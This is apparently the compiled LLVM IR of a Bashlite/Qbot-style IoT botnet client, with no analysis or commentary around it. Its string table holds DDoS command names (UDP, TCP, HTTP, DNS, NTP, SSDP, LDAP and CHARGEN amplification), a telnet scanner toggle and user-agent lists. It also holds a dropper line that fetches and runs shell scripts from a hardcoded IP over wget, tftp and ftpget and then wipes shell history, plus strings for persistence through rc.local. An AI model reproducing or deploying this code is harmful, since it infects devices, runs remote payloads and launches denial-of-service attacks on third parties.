@.str.489 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620\00", align 1
@.str.490 = private unnamed_addr constant [106 x i8] c"Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; 1 subscribers; feed-id=9422214874901413839)\00", align 1
@.str.491 = private unnamed_addr constant [72 x i8] c"Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)\00", align 1
@.str.492 = private unnamed_addr constant [134 x i8] c"Mozilla/5.0 (Linux; Android 4.2.2; AFTB Build/JDQ39) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.173 Mobile Safari/537.22\00", align 1
@.str.493 = private unnamed_addr constant [74 x i8] c"Mozilla/5.0 (PLAYSTATION 3 4.66) AppleWebKit/531.22.8 (KHTML, like Gecko)\00", align 1
@.str.494 = private unnamed_addr constant [22 x i8] c"Wget/1.12 (linux-gnu)\00", align 1
@.str.495 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@.str.496 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@.str.497 = private unnamed_addr constant [112 x i8] c"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US\00", align 1
@.str.502 = private unnamed_addr constant [8 x i8] c"CHARGEN\00", align 1
@.str.503 = private unnamed_addr constant [40 x i8] c"cd; ./chargen %s %s chargen.txt 2 -1 %s\00", align 1
@.str.504 = private unnamed_addr constant [5 x i8] c"LDAP\00", align 1
@.str.505 = private unnamed_addr constant [34 x i8] c"cd; ./ldap %s %s ldap.txt 2 -1 %s\00", align 1
@.str.506 = private unnamed_addr constant [7 x i8] c"REAPER\00", align 1
@.str.507 = private unnamed_addr constant [30 x i8] c"./ldap %s %s ldap.txt 2 -1 %s\00", align 1
@.str.508 = private unnamed_addr constant [4 x i8] c"NTP\00", align 1
@.str.509 = private unnamed_addr constant [29 x i8] c"cd; ./ntp %s %s ntp.txt 2 %s\00", align 1
@.str.510 = private unnamed_addr constant [5 x i8] c"SSDP\00", align 1
@.str.511 = private unnamed_addr constant [34 x i8] c"cd; ./ssdp %s %s ssdp.txt 2 -1 %s\00", align 1
@.str.512 = private unnamed_addr constant [4 x i8] c"DNS\00", align 1
@.str.513 = private unnamed_addr constant [32 x i8] c"cd; ./dns %s %s dns.txt 2 -1 %s\00", align 1
@.str.514 = private unnamed_addr constant [4 x i8] c"TS3\00", align 1
@.str.515 = private unnamed_addr constant [44 x i8] c"cd; cd supreme; ./ts3 %s %s ts3.txt 2 -1 %s\00", align 1
@.str.516 = private unnamed_addr constant [439 x i8] c"cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;wget http://46.101.35.30/shitty.sh; chmod 777 shitty.sh; sh shitty.sh; tftp 46.101.35.30 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 46.101.35.30; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 46.101.35.30 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf shitty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *; history -c\00", align 1
@.str.517 = private unnamed_addr constant [4 x i8] c"%d\0A\00", align 1
@.str.518 = private unnamed_addr constant [6 x i8] c"TABLE\00", align 1
@.str.519 = private unnamed_addr constant [7 x i8] c"UPDATE\00", align 1
@.str.520 = private unnamed_addr constant [7 x i8] c"TELNET\00", align 1
@.str.521 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.522 = private unnamed_addr constant [21 x i8] c"HUMANS SHUTTING DOWN\00", align 1
@.str.523 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.524 = private unnamed_addr constant [47 x i8] c"\1B[0;36mHUMANS SEARCHING ON | IP: \1B[0;37m%s\1B[0m\00", align 1
@.str.525 = private unnamed_addr constant [23 x i8] c"IMAASSHOLETHATBOTKILLS\00", align 1
@.str.526 = private unnamed_addr constant [24 x i8] c"HUMANS KILLING | IP: %s\00", align 1
@.str.527 = private unnamed_addr constant [12 x i8] c"GETPUBLICIP\00", align 1
@.str.528 = private unnamed_addr constant [4 x i8] c"AMP\00", align 1
@.str.529 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.530 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.531 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.532 = private unnamed_addr constant [4 x i8] c"CNC\00", align 1
@.str.533 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.534 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.535 = private unnamed_addr constant [13 x i8] c"DDOS STOPPED\00", align 1
@.str.536 = private unnamed_addr constant [16 x i8] c"NO DDOS STOPPED\00", align 1
@.str.537 = private unnamed_addr constant [7 x i8] c"HAHANO\00", align 1
@.str.538 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.539 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.540 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.541 = private unnamed_addr constant [6 x i8] c"HUMAN\00", align 1
@.str.542 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.543 = private unnamed_addr constant [19 x i8] c"/etc/rc.d/rc.local\00", align 1
@.str.544 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.545 = private unnamed_addr constant [13 x i8] c"/etc/rc.conf\00", align 1
@.str.546 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.547 = private unnamed_addr constant [8 x i8] c"\22%s%s\22\0A\00", align 1
@.str.548 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.550 = private unnamed_addr constant [44 x i8] c"\1B[0;36mNEW %s CONNECTED | IP: \1B[0;37m%s\1B[0m\00", align 1
@.str.551 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.552 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.553 = private unnamed_addr constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00", align 1
@.str.554 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.555 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.556 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.557 = private unnamed_addr constant [2 x i8] c" \00", align 1
@GetRandomPublicIP.ipState.0 = internal unnamed_addr global i8 0, align 1
@GetRandomPublicIP.ipState.1 = internal unnamed_addr global i8 0, align 1
@GetRandomPublicIP.ipState.2 = internal unnamed_addr global i8 0, align 1
@GetRandomPublicIP.ipState.3 = internal unnamed_addr global i8 0, align 1

; Function Attrs: noinline norecurse nounwind uwtable
define void @init_rand(i32) local_unnamed_addr #0 {
min.iters.checked:
  store i32 %0, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %1 = add i32 %0, -1640531527
  store i32 %1, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %2 = add i32 %0, 1013904242
  store i32 %2, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  %vector.recur.init = insertelement <2 x i32> undef, i32 %0, i32 1
  %load_initial = load <2 x i32>, <2 x i32>* bitcast (i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1) to <2 x i32>*), align 4
  br label %vector.body

vector.body:                                      ; preds = %vector.body, %min.iters.checked
  %store_forwarded = phi <2 x i32> [ %load_initial, %min.iters.checked ], [ %16, %vector.body ]
  %index = phi i64 [ 0, %min.iters.checked ], [ %index.next.1, %vector.body ]
  %vector.recur = phi <2 x i32> [ %vector.recur.init, %min.iters.checked ], [ %8, %vector.body ]
  %vec.ind = phi <2 x i64> [ <i64 3, i64 4>, %min.iters.checked ], [ %vec.ind.next.1, %vector.body ]
  %3 = or i64 %index, 3
  %4 = shufflevector <2 x i32> %vector.recur, <2 x i32> %store_forwarded, <2 x i32> <i32 1, i32 2>
  %5 = trunc <2 x i64> %vec.ind to <2 x i32>
  %6 = xor <2 x i32> %5, <i32 -1640531527, i32 -1640531527>
  %7 = xor <2 x i32> %6, %4
  %8 = xor <2 x i32> %7, %store_forwarded
  %9 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %3
  %10 = bitcast i32* %9 to <2 x i32>*
  store <2 x i32> %8, <2 x i32>* %10, align 4
  %vec.ind.next = add <2 x i64> %vec.ind, <i64 2, i64 2>
  %11 = add nsw i64 %index, 5
  %12 = shufflevector <2 x i32> %store_forwarded, <2 x i32> %8, <2 x i32> <i32 1, i32 2>
  %13 = trunc <2 x i64> %vec.ind.next to <2 x i32>
  %14 = xor <2 x i32> %13, <i32 -1640531527, i32 -1640531527>
  %15 = xor <2 x i32> %14, %12
  %16 = xor <2 x i32> %15, %8
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %11
  %18 = bitcast i32* %17 to <2 x i32>*
  store <2 x i32> %16, <2 x i32>* %18, align 4
  %index.next.1 = add nsw i64 %index, 4
  %vec.ind.next.1 = add <2 x i64> %vec.ind, <i64 4, i64 4>
  %19 = icmp eq i64 %index.next.1, 4092
  br i1 %19, label %middle.block, label %vector.body, !llvm.loop !1

middle.block:                                     ; preds = %vector.body
  br label %._crit_edge

._crit_edge:                                      ; preds = %middle.block
  %vector.recur.extract = extractelement <2 x i32> %8, i32 1
  %20 = load i32, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 4093), align 4
  %21 = xor i32 %vector.recur.extract, -1640532410
  %22 = xor i32 %21, %20
  store i32 %22, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 4095), align 4
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define i32 @rand_cmwc() local_unnamed_addr #0 {
  %1 = load i32, i32* @rand_cmwc.i, align 4
  %2 = add i32 %1, 1
  %3 = and i32 %2, 4095
  store i32 %3, i32* @rand_cmwc.i, align 4
  %4 = zext i32 %3 to i64
  %5 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %4
  %6 = load i32, i32* %5, align 4
  %7 = zext i32 %6 to i64
  %8 = mul nuw nsw i64 %7, 18782
  %9 = load i32, i32* @c, align 4
  %10 = zext i32 %9 to i64
  %11 = add nuw nsw i64 %8, %10
  %12 = lshr i64 %11, 32
  %13 = trunc i64 %12 to i32
  %14 = add nuw nsw i64 %12, %11
  %15 = trunc i64 %14 to i32
  %16 = icmp ult i32 %15, %13
  %17 = zext i1 %16 to i32
  %storemerge = add nuw nsw i32 %17, %13
  store i32 %storemerge, i32* @c, align 4
  %.neg7 = sext i1 %16 to i32
  %.0.neg = sub i32 -2, %15
  %18 = add i32 %.0.neg, %.neg7
  store i32 %18, i32* %5, align 4
  ret i32 %18
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8* nocapture) local_unnamed_addr #1 {
  %2 = tail call i64 @strlen(i8* %0) #15
  %3 = add i64 %2, 4294967295
  br label %4

; <label>:4:                                      ; preds = %4, %1
  %indvars.iv29 = phi i64 [ %indvars.iv.next30, %4 ], [ 0, %1 ]
  %5 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv29
  %6 = load i8, i8* %5, align 1
  %7 = sext i8 %6 to i32
  %8 = tail call i32 @isspace(i32 %7) #15
  %9 = icmp eq i32 %8, 0
  %indvars.iv.next30 = add nuw i64 %indvars.iv29, 1
  br i1 %9, label %.preheader, label %4

.preheader:                                       ; preds = %4
  %10 = trunc i64 %3 to i32
  %11 = trunc i64 %indvars.iv29 to i32
  %12 = icmp slt i32 %10, %11
  br i1 %12, label %.critedge.preheader, label %.lr.ph22.preheader

.lr.ph22.preheader:                               ; preds = %.preheader
  %sext = shl i64 %3, 32
  %13 = ashr exact i64 %sext, 32
  %sext31 = shl i64 %indvars.iv29, 32
  %14 = ashr exact i64 %sext31, 32
  br label %.lr.ph22

.critedge.preheader.loopexit:                     ; preds = %.lr.ph22, %80
  %.0.lcssa.ph = phi i32 [ %79, %.lr.ph22 ], [ %81, %80 ]
  br label %.critedge.preheader

.critedge.preheader:                              ; preds = %.critedge.preheader.loopexit, %.preheader
  %.0.lcssa = phi i32 [ %10, %.preheader ], [ %.0.lcssa.ph, %.critedge.preheader.loopexit ]
  %15 = icmp sgt i32 %11, %.0.lcssa
  br i1 %15, label %.critedge._crit_edge, label %.critedge.preheader26

.critedge.preheader26:                            ; preds = %.critedge.preheader
  %sext32 = shl i64 %indvars.iv29, 32
  %16 = ashr exact i64 %sext32, 32
  %17 = sext i32 %.0.lcssa to i64
  %18 = icmp sgt i64 %17, %16
  %smax = select i1 %18, i64 %17, i64 %16
  %19 = add nsw i64 %smax, 1
  %20 = sub nsw i64 %19, %16
  %min.iters.check = icmp ult i64 %20, 32
  br i1 %min.iters.check, label %.critedge.preheader39, label %min.iters.checked

.critedge.preheader39:                            ; preds = %middle.block, %vector.memcheck, %min.iters.checked, %.critedge.preheader26
  %indvars.iv.ph = phi i64 [ %16, %vector.memcheck ], [ %16, %min.iters.checked ], [ %16, %.critedge.preheader26 ], [ %ind.end, %middle.block ]
  br label %.critedge

min.iters.checked:                                ; preds = %.critedge.preheader26
  %n.vec = and i64 %20, -32
  %cmp.zero = icmp eq i64 %n.vec, 0
  br i1 %cmp.zero, label %.critedge.preheader39, label %vector.memcheck

vector.memcheck:                                  ; preds = %min.iters.checked
  %21 = icmp sgt i64 %17, %16
  %smax34 = select i1 %21, i64 %17, i64 %16
  %22 = add nsw i64 %smax34, 1
  %23 = sub nsw i64 %22, %16
  %scevgep = getelementptr i8, i8* %0, i64 %23
  %scevgep35 = getelementptr i8, i8* %0, i64 %16
  %scevgep36 = getelementptr i8, i8* %0, i64 %22
  %bound0 = icmp ugt i8* %scevgep36, %0
  %bound1 = icmp ult i8* %scevgep35, %scevgep
  %memcheck.conflict = and i1 %bound0, %bound1
  %ind.end = add nsw i64 %16, %n.vec
  br i1 %memcheck.conflict, label %.critedge.preheader39, label %vector.body.preheader

vector.body.preheader:                            ; preds = %vector.memcheck
  %24 = add nsw i64 %n.vec, -32
  %25 = lshr exact i64 %24, 5
  %26 = add nuw nsw i64 %25, 1
  %xtraiter = and i64 %26, 3
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %vector.body.prol.loopexit, label %vector.body.prol.preheader

vector.body.prol.preheader:                       ; preds = %vector.body.preheader
  br label %vector.body.prol

vector.body.prol:                                 ; preds = %vector.body.prol, %vector.body.prol.preheader
  %index.prol = phi i64 [ %index.next.prol, %vector.body.prol ], [ 0, %vector.body.prol.preheader ]
  %prol.iter = phi i64 [ %prol.iter.sub, %vector.body.prol ], [ %xtraiter, %vector.body.prol.preheader ]
  %27 = add i64 %16, %index.prol
  %28 = getelementptr inbounds i8, i8* %0, i64 %27
  %29 = bitcast i8* %28 to <16 x i8>*
  %wide.load.prol = load <16 x i8>, <16 x i8>* %29, align 1, !alias.scope !4
  %30 = getelementptr i8, i8* %28, i64 16
  %31 = bitcast i8* %30 to <16 x i8>*
  %wide.load38.prol = load <16 x i8>, <16 x i8>* %31, align 1, !alias.scope !4
  %32 = getelementptr inbounds i8, i8* %0, i64 %index.prol
  %33 = bitcast i8* %32 to <16 x i8>*
  store <16 x i8> %wide.load.prol, <16 x i8>* %33, align 1, !alias.scope !7, !noalias !4
  %34 = getelementptr i8, i8* %32, i64 16
  %35 = bitcast i8* %34 to <16 x i8>*
  store <16 x i8> %wide.load38.prol, <16 x i8>* %35, align 1, !alias.scope !7, !noalias !4
  %index.next.prol = add i64 %index.prol, 32
  %prol.iter.sub = add i64 %prol.iter, -1
  %prol.iter.cmp = icmp eq i64 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %vector.body.prol.loopexit.unr-lcssa, label %vector.body.prol, !llvm.loop !9

vector.body.prol.loopexit.unr-lcssa:              ; preds = %vector.body.prol
  br label %vector.body.prol.loopexit

vector.body.prol.loopexit:                        ; preds = %vector.body.preheader, %vector.body.prol.loopexit.unr-lcssa
  %index.unr = phi i64 [ 0, %vector.body.preheader ], [ %index.next.prol, %vector.body.prol.loopexit.unr-lcssa ]
  %36 = icmp ult i64 %24, 96
  br i1 %36, label %middle.block, label %vector.body.preheader.new

vector.body.preheader.new:                        ; preds = %vector.body.prol.loopexit
  br label %vector.body

vector.body:                                      ; preds = %vector.body, %vector.body.preheader.new
  %index = phi i64 [ %index.unr, %vector.body.preheader.new ], [ %index.next.3, %vector.body ]
  %37 = add i64 %16, %index
  %38 = getelementptr inbounds i8, i8* %0, i64 %37
  %39 = bitcast i8* %38 to <16 x i8>*
  %wide.load = load <16 x i8>, <16 x i8>* %39, align 1, !alias.scope !4
  %40 = getelementptr i8, i8* %38, i64 16
  %41 = bitcast i8* %40 to <16 x i8>*
  %wide.load38 = load <16 x i8>, <16 x i8>* %41, align 1, !alias.scope !4
  %42 = getelementptr inbounds i8, i8* %0, i64 %index
  %43 = bitcast i8* %42 to <16 x i8>*
  store <16 x i8> %wide.load, <16 x i8>* %43, align 1, !alias.scope !7, !noalias !4
  %44 = getelementptr i8, i8* %42, i64 16
  %45 = bitcast i8* %44 to <16 x i8>*
  store <16 x i8> %wide.load38, <16 x i8>* %45, align 1, !alias.scope !7, !noalias !4
  %index.next = add i64 %index, 32
  %46 = add i64 %16, %index.next
  %47 = getelementptr inbounds i8, i8* %0, i64 %46
  %48 = bitcast i8* %47 to <16 x i8>*
  %wide.load.1 = load <16 x i8>, <16 x i8>* %48, align 1, !alias.scope !4
  %49 = getelementptr i8, i8* %47, i64 16
  %50 = bitcast i8* %49 to <16 x i8>*
  %wide.load38.1 = load <16 x i8>, <16 x i8>* %50, align 1, !alias.scope !4
  %51 = getelementptr inbounds i8, i8* %0, i64 %index.next
  %52 = bitcast i8* %51 to <16 x i8>*
  store <16 x i8> %wide.load.1, <16 x i8>* %52, align 1, !alias.scope !7, !noalias !4
  %53 = getelementptr i8, i8* %51, i64 16
  %54 = bitcast i8* %53 to <16 x i8>*
  store <16 x i8> %wide.load38.1, <16 x i8>* %54, align 1, !alias.scope !7, !noalias !4
  %index.next.1 = add i64 %index, 64
  %55 = add i64 %16, %index.next.1
  %56 = getelementptr inbounds i8, i8* %0, i64 %55
  %57 = bitcast i8* %56 to <16 x i8>*
  %wide.load.2 = load <16 x i8>, <16 x i8>* %57, align 1, !alias.scope !4
  %58 = getelementptr i8, i8* %56, i64 16
  %59 = bitcast i8* %58 to <16 x i8>*
  %wide.load38.2 = load <16 x i8>, <16 x i8>* %59, align 1, !alias.scope !4
  %60 = getelementptr inbounds i8, i8* %0, i64 %index.next.1
  %61 = bitcast i8* %60 to <16 x i8>*
  store <16 x i8> %wide.load.2, <16 x i8>* %61, align 1, !alias.scope !7, !noalias !4
  %62 = getelementptr i8, i8* %60, i64 16
  %63 = bitcast i8* %62 to <16 x i8>*
  store <16 x i8> %wide.load38.2, <16 x i8>* %63, align 1, !alias.scope !7, !noalias !4
  %index.next.2 = add i64 %index, 96
  %64 = add i64 %16, %index.next.2
  %65 = getelementptr inbounds i8, i8* %0, i64 %64
  %66 = bitcast i8* %65 to <16 x i8>*
  %wide.load.3 = load <16 x i8>, <16 x i8>* %66, align 1, !alias.scope !4
  %67 = getelementptr i8, i8* %65, i64 16
  %68 = bitcast i8* %67 to <16 x i8>*
  %wide.load38.3 = load <16 x i8>, <16 x i8>* %68, align 1, !alias.scope !4
  %69 = getelementptr inbounds i8, i8* %0, i64 %index.next.2
  %70 = bitcast i8* %69 to <16 x i8>*
  store <16 x i8> %wide.load.3, <16 x i8>* %70, align 1, !alias.scope !7, !noalias !4
  %71 = getelementptr i8, i8* %69, i64 16
  %72 = bitcast i8* %71 to <16 x i8>*
  store <16 x i8> %wide.load38.3, <16 x i8>* %72, align 1, !alias.scope !7, !noalias !4
  %index.next.3 = add i64 %index, 128
  %73 = icmp eq i64 %index.next.3, %n.vec
  br i1 %73, label %middle.block.unr-lcssa, label %vector.body, !llvm.loop !11

middle.block.unr-lcssa:                           ; preds = %vector.body
  br label %middle.block

middle.block:                                     ; preds = %vector.body.prol.loopexit, %middle.block.unr-lcssa
  %cmp.n = icmp eq i64 %20, %n.vec
  br i1 %cmp.n, label %.critedge._crit_edge, label %.critedge.preheader39

.lr.ph22:                                         ; preds = %.lr.ph22.preheader, %80
  %indvars.iv27 = phi i64 [ %13, %.lr.ph22.preheader ], [ %indvars.iv.next28, %80 ]
  %.021 = phi i32 [ %10, %.lr.ph22.preheader ], [ %81, %80 ]
  %74 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv27
  %75 = load i8, i8* %74, align 1
  %76 = sext i8 %75 to i32
  %77 = tail call i32 @isspace(i32 %76) #15
  %78 = icmp eq i32 %77, 0
  %79 = trunc i64 %indvars.iv27 to i32
  br i1 %78, label %.critedge.preheader.loopexit, label %80

; <label>:80:                                     ; preds = %.lr.ph22
  %indvars.iv.next28 = add nsw i64 %indvars.iv27, -1
  %81 = add nsw i32 %.021, -1
  %82 = icmp sgt i64 %indvars.iv27, %14
  br i1 %82, label %.lr.ph22, label %.critedge.preheader.loopexit

.critedge:                                        ; preds = %.critedge.preheader39, %.critedge
  %indvars.iv = phi i64 [ %indvars.iv.next, %.critedge ], [ %indvars.iv.ph, %.critedge.preheader39 ]
  %83 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %84 = load i8, i8* %83, align 1
  %85 = sub nsw i64 %indvars.iv, %16
  %86 = getelementptr inbounds i8, i8* %0, i64 %85
  store i8 %84, i8* %86, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %87 = icmp slt i64 %indvars.iv, %17
  br i1 %87, label %.critedge, label %.critedge._crit_edge.loopexit, !llvm.loop !12

.critedge._crit_edge.loopexit:                    ; preds = %.critedge
  br label %.critedge._crit_edge

.critedge._crit_edge:                             ; preds = %.critedge._crit_edge.loopexit, %middle.block, %.critedge.preheader
  %.019.lcssa = phi i64 [ %indvars.iv29, %.critedge.preheader ], [ %ind.end, %middle.block ], [ %indvars.iv.next, %.critedge._crit_edge.loopexit ]
  %88 = sub i64 %.019.lcssa, %indvars.iv29
  %sext33 = shl i64 %88, 32
  %89 = ashr exact i64 %sext33, 32
  %90 = getelementptr inbounds i8, i8* %0, i64 %89
  store i8 0, i8* %90, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %2 = alloca [1 x %struct.__va_list_tag], align 16
  %3 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %2, i64 0, i64 0
  %4 = bitcast [1 x %struct.__va_list_tag]* %2 to i8*
  call void @llvm.va_start(i8* nonnull %4)
  %5 = call fastcc i32 @print(i8** null, i8* %0, %struct.__va_list_tag* nonnull %3)
  ret i32 %5
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #3

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @print(i8**, i8* nocapture readonly, %struct.__va_list_tag*) unnamed_addr #1 {
  %4 = alloca [2 x i8], align 1
  %5 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %6 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %7 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %8 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 0
  %9 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 1
  br label %10

; <label>:10:                                     ; preds = %138, %3
  %.061 = phi i32 [ 0, %3 ], [ %.162, %138 ]
  %.0 = phi i8* [ %1, %3 ], [ %139, %138 ]
  %11 = load i8, i8* %.0, align 1
  switch i8 %11, label %134 [
    i8 0, label %140
    i8 37, label %12
  ]

; <label>:12:                                     ; preds = %10
  %13 = getelementptr inbounds i8, i8* %.0, i64 1
  %14 = load i8, i8* %13, align 1
  switch i8 %14, label %.preheader70 [
    i8 0, label %140
    i8 37, label %134
    i8 45, label %15
  ]

; <label>:15:                                     ; preds = %12
  %16 = getelementptr inbounds i8, i8* %.0, i64 2
  %.pre = load i8, i8* %16, align 1
  br label %.preheader70

.preheader70:                                     ; preds = %15, %12
  %17 = phi i8 [ %14, %12 ], [ %.pre, %15 ]
  %.063.ph = phi i32 [ 0, %12 ], [ 1, %15 ]
  %.1.ph = phi i8* [ %13, %12 ], [ %16, %15 ]
  %18 = icmp eq i8 %17, 48
  br i1 %18, label %.lr.ph.preheader, label %.preheader

.lr.ph.preheader:                                 ; preds = %.preheader70
  br label %.lr.ph

.preheader.loopexit:                              ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader70
  %19 = phi i8 [ %17, %.preheader70 ], [ %23, %.preheader.loopexit ]
  %.063.lcssa = phi i32 [ %.063.ph, %.preheader70 ], [ %22, %.preheader.loopexit ]
  %.1.lcssa = phi i8* [ %.1.ph, %.preheader70 ], [ %21, %.preheader.loopexit ]
  %.off74 = add i8 %19, -48
  %20 = icmp ult i8 %.off74, 10
  br i1 %20, label %.lr.ph77.preheader, label %.critedge

.lr.ph77.preheader:                               ; preds = %.preheader
  br label %.lr.ph77

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.172 = phi i8* [ %21, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %.06371 = phi i32 [ %22, %.lr.ph ], [ %.063.ph, %.lr.ph.preheader ]
  %21 = getelementptr inbounds i8, i8* %.172, i64 1
  %22 = or i32 %.06371, 2
  %23 = load i8, i8* %21, align 1
  %24 = icmp eq i8 %23, 48
  br i1 %24, label %.lr.ph, label %.preheader.loopexit

.lr.ph77:                                         ; preds = %.lr.ph77.preheader, %.lr.ph77
  %25 = phi i8 [ %31, %.lr.ph77 ], [ %19, %.lr.ph77.preheader ]
  %.276 = phi i8* [ %30, %.lr.ph77 ], [ %.1.lcssa, %.lr.ph77.preheader ]
  %.06475 = phi i32 [ %29, %.lr.ph77 ], [ 0, %.lr.ph77.preheader ]
  %26 = zext i8 %25 to i32
  %27 = mul nsw i32 %.06475, 10
  %28 = add i32 %27, -48
  %29 = add i32 %28, %26
  %30 = getelementptr inbounds i8, i8* %.276, i64 1
  %31 = load i8, i8* %30, align 1
  %.off = add i8 %31, -48
  %32 = icmp ult i8 %.off, 10
  br i1 %32, label %.lr.ph77, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph77
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.064.lcssa = phi i32 [ 0, %.preheader ], [ %29, %.critedge.loopexit ]
  %.2.lcssa = phi i8* [ %.1.lcssa, %.preheader ], [ %30, %.critedge.loopexit ]
  %.lcssa = phi i8 [ %19, %.preheader ], [ %31, %.critedge.loopexit ]
  switch i8 %.lcssa, label %138 [
    i8 115, label %33
    i8 100, label %53
    i8 120, label %69
    i8 88, label %85
    i8 117, label %101
    i8 99, label %117
  ]

; <label>:33:                                     ; preds = %.critedge
  %34 = load i32, i32* %5, align 8
  %35 = icmp ult i32 %34, 41
  br i1 %35, label %36, label %41

; <label>:36:                                     ; preds = %33
  %37 = load i8*, i8** %6, align 8
  %38 = sext i32 %34 to i64
  %39 = getelementptr i8, i8* %37, i64 %38
  %40 = add i32 %34, 8
  store i32 %40, i32* %5, align 8
  br label %44

; <label>:41:                                     ; preds = %33
  %42 = load i8*, i8** %7, align 8
  %43 = getelementptr i8, i8* %42, i64 8
  store i8* %43, i8** %7, align 8
  br label %44

; <label>:44:                                     ; preds = %41, %36
  %.in69 = phi i8* [ %39, %36 ], [ %42, %41 ]
  %45 = bitcast i8* %.in69 to i32*
  %46 = load i32, i32* %45, align 4
  %47 = sext i32 %46 to i64
  %48 = inttoptr i64 %47 to i8*
  %49 = icmp ne i32 %46, 0
  %50 = select i1 %49, i8* %48, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.558, i64 0, i64 0)
  %51 = tail call fastcc i32 @prints(i8** %0, i8* %50, i32 %.064.lcssa, i32 %.063.lcssa)
  %52 = add nsw i32 %51, %.061
  br label %138

; <label>:53:                                     ; preds = %.critedge
  %54 = load i32, i32* %5, align 8
  %55 = icmp ult i32 %54, 41
  br i1 %55, label %56, label %61

; <label>:56:                                     ; preds = %53
  %57 = load i8*, i8** %6, align 8
  %58 = sext i32 %54 to i64
  %59 = getelementptr i8, i8* %57, i64 %58
  %60 = add i32 %54, 8
  store i32 %60, i32* %5, align 8
  br label %64

; <label>:61:                                     ; preds = %53
  %62 = load i8*, i8** %7, align 8
  %63 = getelementptr i8, i8* %62, i64 8
  store i8* %63, i8** %7, align 8
  br label %64

; <label>:64:                                     ; preds = %61, %56
  %.in68 = phi i8* [ %59, %56 ], [ %62, %61 ]
  %65 = bitcast i8* %.in68 to i32*
  %66 = load i32, i32* %65, align 4
